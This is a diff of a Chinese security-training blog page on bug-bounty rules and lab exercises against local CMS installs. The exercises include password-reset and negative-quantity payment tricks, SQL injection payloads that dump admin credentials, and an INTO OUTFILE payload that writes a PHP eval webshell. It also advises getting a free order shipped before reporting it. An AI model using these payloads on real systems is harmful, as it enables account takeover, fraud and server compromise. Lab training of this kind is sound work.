@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="学习Python中的一个重要数据容器：元组">
-<title>6.2 数据容器：元组</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="挖洞规则（不是渗透） bug hunter vs pentest\n什么是SRC？\nSecurity Response Center 安全应急响应中心\n现在市面上存在了各种厂商的安全应急响应中心：https://www.anquanke.com/src/\n了解你所要提交的SRC平台规则和要求，不同的平台给出的评分标准不同。\n">
+<title>1.30 漏洞挖掘</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/6.2-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%85%83%E7%BB%84/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="6.2 数据容器：元组">
-<meta property='og:description' content="学习Python中的一个重要数据容器：元组">
-<meta property='og:url' content='https://www.retr0.xyz/p/6.2-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%85%83%E7%BB%84/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.30 漏洞挖掘">
+<meta property='og:description' content="挖洞规则（不是渗透） bug hunter vs pentest\n什么是SRC？\nSecurity Response Center 安全应急响应中心\n现在市面上存在了各种厂商的安全应急响应中心：https://www.anquanke.com/src/\n了解你所要提交的SRC平台规则和要求，不同的平台给出的评分标准不同。\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-03T18:14:15&#43;08:00'/><meta property='article:modified_time' content='2025-11-03T18:14:15&#43;08:00'/>
-<meta name="twitter:title" content="6.2 数据容器：元组">
-<meta name="twitter:description" content="学习Python中的一个重要数据容器：元组">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-30T20:41:45&#43;08:00'/><meta property='article:modified_time' content='2026-01-30T20:41:45&#43;08:00'/>
+<meta name="twitter:title" content="1.30 漏洞挖掘">
+<meta name="twitter:description" content="挖洞规则（不是渗透） bug hunter vs pentest\n什么是SRC？\nSecurity Response Center 安全应急响应中心\n现在市面上存在了各种厂商的安全应急响应中心：https://www.anquanke.com/src/\n了解你所要提交的SRC平台规则和要求，不同的平台给出的评分标准不同。\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,23 +319,24 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#元组的定义">元组的定义</a></li>
-    <li><a href="#元组的常用操作同列表基本一致">元组的常用操作	（同列表基本一致）</a>
+    <li><a href="#挖洞规则不是渗透">挖洞规则（不是渗透）</a></li>
+    <li><a href="#概念解释">概念解释</a>
       <ol>
-        <li><a href="#元组的索引">元组的索引</a></li>
-        <li><a href="#查询元组中元素的下标号">查询元组中元素的下标号</a></li>
-        <li><a href="#统计某元素在元组中的数量">统计某元素在元组中的数量</a></li>
-        <li><a href="#统计元组内全部元素数量">统计元组内全部元素数量</a></li>
-        <li><a href="#特别修改元组内的列表的元素">特别：修改元组内的列表的元素</a></li>
+        <li><a href="#越权">越权</a></li>
+        <li><a href="#支付漏洞">支付漏洞</a></li>
       </ol>
     </li>
-    <li><a href="#元组的循环遍历">元组的循环遍历</a>
+    <li><a href="#靶场实操">靶场实操</a>
       <ol>
-        <li><a href="#while循环">while循环</a></li>
-        <li><a href="#for循环">for循环</a></li>
+        <li><a href="#越权-1">越权</a>
+          <ol>
+            <li><a href="#修改他人密码">修改他人密码</a></li>
+          </ol>
+        </li>
+        <li><a href="#支付漏洞-1">支付漏洞</a></li>
+        <li><a href="#sql注入">sql注入</a></li>
       </ol>
     </li>
-    <li><a href="#紧急考点补充zip函数">紧急考点补充：zip()函数</a></li>
   </ol>
 </nav>
         </div>
@@ -354,8 +355,12 @@
     
     <header class="article-category">
         
-            <a href="/categories/python/" style="background-color: #2A87D8; color: #fff;">
-                Python
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
             </a>
         
     </header>
@@ -363,13 +368,9 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/6.2-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%85%83%E7%BB%84/">6.2 数据容器：元组</a>
+            <a href="/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">1.30 漏洞挖掘</a>
         </h2>
     
-        
-        <h3 class="article-subtitle">
-            学习Python中的一个重要数据容器：元组
-        </h3>
         
     </div>
 
@@ -389,7 +390,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-11-03 | 18:14</time>
+                <time class="article-time--published">2026-01-30 | 20:41</time>
             </div>
         
 
@@ -412,162 +413,125 @@
     <section class="article-content">
     
     
-    <blockquote>
-<p>什么是元组？</p>
-<p><strong>元组</strong>是Python中的一种基本数据结构，它是一个不可变的序列，意味着<u><font style="color:#DF2A3F">一旦创建，元组中的元素不能被修改、添加或删除。</font></u></p>
+    <h2 id="挖洞规则不是渗透">挖洞规则（不是渗透）
+</h2><blockquote>
+<p>bug hunter vs pentest</p>
 </blockquote>
-<h2 id="元组的定义">元组的定义
-</h2><p>定义元组使用<font style="color:#DF2A3F;">小括号</font>，且用<font style="color:#DF2A3F;">逗号</font>隔开各个数据，<font style="color:#DF2A3F;">数据可以是不同数据类型</font></p>
+<p><strong>什么是SRC？</strong></p>
+<p>Security Response Center 安全应急响应中心</p>
+<p>现在市面上存在了各种厂商的安全应急响应中心：<a class="link" href="https://www.anquanke.com/src/"  target="_blank" rel="noopener"
+    >https://www.anquanke.com/src/</a></p>
+<p>了解你所要提交的SRC平台规则和要求，不同的平台给出的评分标准不同。</p>
+<p>详细阅读测试范围，不要超出，会有非法测试的风险。</p>
+<p>遵循安全测试规范，比如sql注入会有要求，哪些东西不能读取，最多读取多少条。</p>
+<p>挖到数据库，只需要读取一两条证明。</p>
+<p>不要使用自动化工具，sqlmap（自动化软件有可能会造成不可预料的后果，比如删库） 条件允许测试越权漏洞，注册2个+账号，不要涉及在线用户。</p>
+<p>大多数厉害网站一般都会出现越权注销功能（很多短信轰炸）</p>
+<p>购物网站0元购或者积分，不会承认，让他发货，你再提交 xss漏洞，在线xss平台（不要用），自己搭建</p>
+<p>情报漏洞不要做： 某公司业务有漏洞可以删差评，有人进行出售，然后把出售截图提交给公司，公司核实之后支付报酬</p>
+<p>游戏外挂出售 电商信息出售 刷钻漏洞等 如果可以进而发现漏洞就可以提2次</p>
+<p>企业内鬼证据、bc网站不要碰（国内，除非你水平特别高）</p>
+<p>没有授权不要碰，某些奇怪的src不要碰 做一些大的src，挖洞项目，国外挖洞 bat，字节，美团。。。。。 教育src</p>
+<p><strong>众测：</strong></p>
+<p>（有钱） 漏洞盒子&mdash;-金融&mdash;&ndash;养号</p>
+<p>补天众测&mdash;-白帽子推荐/前300/挖到5个企业src高危/任意src平台年度top3 补天平台&mdash;-专属src&ndash;政府</p>
+<p>360众测（门票ctf注册资格，不一定一直有项目）</p>
+<p>火线平台（比较卷） 雷神众测&mdash;-抢项目&mdash;银行 cve cnvd 编号：（有漏洞变化） cnvd： 三大运营商，国企事业单位 通用性，资产大于等于5000w</p>
+<h2 id="概念解释">概念解释
+</h2><h3 id="越权">越权
+</h3><p>横向越权：同级权限跨越</p>
+<p>纵向越权：拿到不同级别的权限（如Admin）</p>
+<p>未授权：在没有做认证的情况下可以做认证后才能做的操作。</p>
+<h3 id="支付漏洞">支付漏洞
+</h3><p>支付逻辑常见测试:</p>
+<ol>
+<li>熟悉常见支付流程</li>
+</ol>
+<p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p>
+<ol start="2">
+<li>熟悉那些数据篡改</li>
+</ol>
+<p>商品ID,购买价格,购买数量,订单属性,折扣属性,支付方式,支付状态等</p>
+<ol start="3">
+<li>熟悉那些修改方式</li>
+</ol>
+<p>替换支付,重复支付,最小额支付,负数支付,溢出支付,优惠券支付等</p>
+<ol start="4">
+<li>熟悉那些另类方法</li>
+</ol>
+<p>无限试用,越权支付,并发兑换,四舍五入半价购,循环利用优惠券,支付签约逻辑等</p>
+<h2 id="靶场实操">靶场实操
+</h2><blockquote>
+<p>安装metinfo这个cms作为靶场：<a class="link" href="https://pan.baidu.com/s/1NOOP_SuNqeyz2Ld3yQebmg?pwd=8grs"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1NOOP_SuNqeyz2Ld3yQebmg?pwd=8grs</a></p>
+</blockquote>
+<h3 id="越权-1">越权
+</h3><h4 id="修改他人密码">修改他人密码
+</h4><p><strong>横向/纵向越权：</strong></p>
+<p>在修改自己密码时抓包，发现数据包中验证用户身份的只有userid这一个，因此我们尝试修改userid的内容为其他用户，甚至是admin，放包。尝试登录发现成功。</p>
+<hr>
+<p><strong>Tips：</strong> 在实操中成功修改admin密码后无法登录通常是因为管理员的登录页面和普通用户不一样。</p>
+<hr>
+<p><strong>未授权：</strong></p>
+<p>在修改自己密码时尝试把数据包中的cookie删除，发现密码同样可以删除成功。</p>
+<h3 id="支付漏洞-1">支付漏洞
+</h3><blockquote>
+<p>安装easycms：<a class="link" href="https://pan.baidu.com/s/1a3po_LJ2NeWzDMreN3t2rQ?pwd=2uns"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1a3po_LJ2NeWzDMreN3t2rQ?pwd=2uns</a></p>
+</blockquote>
+<p>在购买物品时抓包，发现数据包中并未有价格相关数据，但是又物品id和物品数量，推测网站数据库中将物品id和价格已经绑定。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">GET /index.php?case=archive&amp;act=doorders&amp;aid=83&amp;datatype=&amp;buy=true&amp;thisnum=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里把<code>thisnum</code>的值为-100，发现价格变为负数，提交订单后订单显示支付成功，并且余额增加。</p>
+<h3 id="sql注入">sql注入
+</h3><blockquote>
+<p>安装BESScms：<a class="link" href="https://pan.baidu.com/s/1YkAYFphFxb-_7Y4MGZrcbw?pwd=pnfr"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1YkAYFphFxb-_7Y4MGZrcbw?pwd=pnfr</a></p>
+</blockquote>
+<p>已知管理员登录界面可以进行sql注入，下面展示注入流程：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">admin&#39;or (extractvalue(1,concat(0x7e,database(),0x7e)))#	//besscms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin&#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(table_name) fr from om information_schema.tables whe where re table_schema like database()),0x7e)))# //bees_admin,bees_admin_group,bee
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin&#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(column_name) fr from om information_schema.columns whe where re table_schema like database() a and nd table_name like &#39;bees_admin&#39;),0x7e)))# //id,admin_name,admin_password,ad
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin&#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(admin_name) fr from om bees_admin),0x7e)))# 	//admin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin&#39;or (extractvalue(1,concat(0x7e,substr((selselectect group_concat(admin_password) fr from om bees_admin),1,15),0x7e)))#
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin&#39;or (extractvalue(1,concat(0x7e,substr((selselectect group_concat(admin_password) fr from om bees_admin),16,32),0x7e)))# //21232f297a57a5a743894a0e4a801fc3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们甚至可以不满足于拿到管理员密码，我们尝试注入一句话木马：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">tuple</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;ok&#39;</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="kc">True</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#定义空元组</span>
-</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="p">()</span>		<span class="c1">#方式1</span>
-</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">()</span>	<span class="c1">#方式2</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>注意：如果元组中只有一个元素，它的后面也要加上逗号，例如</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">tuple</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">,)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>此外，元组也可以嵌套</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">tuple</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">),(</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="元组的常用操作同列表基本一致">元组的常用操作	（同列表基本一致）
-</h2><h3 id="元组的索引">元组的索引
-</h3><p>元组同样支持通过下标号正反向索引</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;一&#39;</span><span class="p">,</span><span class="s1">&#39;二&#39;</span><span class="p">,</span><span class="s1">&#39;三&#39;</span><span class="p">,</span><span class="s1">&#39;四&#39;</span><span class="p">,</span><span class="s1">&#39;五&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="查询元组中元素的下标号">查询元组中元素的下标号
-</h3><p>同样只查询到第一个匹配的元素</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;一&#39;</span><span class="p">,</span><span class="s1">&#39;二&#39;</span><span class="p">,</span><span class="s1">&#39;三&#39;</span><span class="p">,</span><span class="s1">&#39;四&#39;</span><span class="p">,</span><span class="s1">&#39;五&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;三&#39;</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="统计某元素在元组中的数量">统计某元素在元组中的数量
-</h3><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="统计元组内全部元素数量">统计元组内全部元素数量
-</h3><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;一&#39;</span><span class="p">,</span><span class="s1">&#39;二&#39;</span><span class="p">,</span><span class="s1">&#39;三&#39;</span><span class="p">,</span><span class="s1">&#39;四&#39;</span><span class="p">,</span><span class="s1">&#39;五&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="特别修改元组内的列表的元素">特别：修改元组内的列表的元素
-</h3><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;hello&#39;</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="n">t1</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">t1</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="元组的循环遍历">元组的循环遍历
-</h2><h3 id="while循环">while循环
-</h3><p>示例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>	<span class="c1">#对元素a进行处理</span>
-</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="for循环">for循环
-</h3><p>示例：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">t</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="紧急考点补充zip函数">紧急考点补充：zip()函数
-</h2><p>Python 中的 <code>zip()</code> 函数用于将多个可迭代对象作为参数，将每个对象中对应的元素打包成一个元组，然后返回这些元组组成的列表。如果传入的迭代器长度不一致，zip() 函数会以最短的迭代器长度为准，返回相同长度的列表。</p>
-<p>在 Python 3 中，为了节约内存，<code>zip()</code> 返回的是一个对象。如果需要展示列表，需要使用 ·list()· 函数进行转换。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">zipped</span> <span class="o">=</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="c1"># 返回一个对象</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">zipped</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">zipped</span><span class="p">))</span> <span class="c1"># 使用 list() 转换为列表</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 输出: [(1, 4), (2, 5), (3, 6)]</span>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">admin&#39;un union ion selselectect 1,2,3,4,0x3c3f706870206576616c28245f504f53545b27313233275d293b3f3e
+</span></span><span class="line"><span class="cl"> in into outoutfilefile &#39;C:/phpstudy_pro/WWW/test/123.php&#39;#
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -632,12 +596,12 @@
             
                 
 <article class="">
-    <a href="/p/11.5-%E5%85%B6%E4%BB%96%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/">
+    <a href="/p/1.29-misc%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.5 其他第三方库</h2>
+            <h2 class="article-title">1.29 misc和流量分析</h2>
         </div>
     </a>
 </article>
@@ -645,12 +609,12 @@
             
                 
 <article class="">
-    <a href="/p/11.4-jieba%E5%BA%93/">
+    <a href="/p/1.27-arp%E6%AC%BA%E9%AA%97%E5%92%8Ccs%E7%9A%84%E4%BD%BF%E7%94%A8/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.4 jieba库</h2>
+            <h2 class="article-title">1.27 arp欺骗和CS的使用</h2>
         </div>
     </a>
 </article>
@@ -658,12 +622,12 @@
             
                 
 <article class="">
-    <a href="/p/11.3-random%E5%BA%93/">
+    <a href="/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.3 random库</h2>
+            <h2 class="article-title">1.26 漏洞复现</h2>
         </div>
     </a>
 </article>
@@ -671,12 +635,12 @@
             
                 
 <article class="">
-    <a href="/p/11.2-turtle%E5%BA%93%E7%BB%98%E5%9B%BE/">
+    <a href="/p/1.25-%E6%9B%B4%E5%A4%9A%E6%9A%B4%E7%A0%B4xsscsrf%E5%92%8Csql/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.2 turtle库绘图</h2>
+            <h2 class="article-title">1.25 更多暴破、XSS、CSRF和sql</h2>
         </div>
     </a>
 </article>
@@ -684,12 +648,12 @@
             
                 
 <article class="">
-    <a href="/p/11.1-format%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/">
+    <a href="/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.1 format格式化输出</h2>
+            <h2 class="article-title">1.24-2 弱类型比较漏洞及序列化与反序列化</h2>
         </div>
     </a>
 </article>
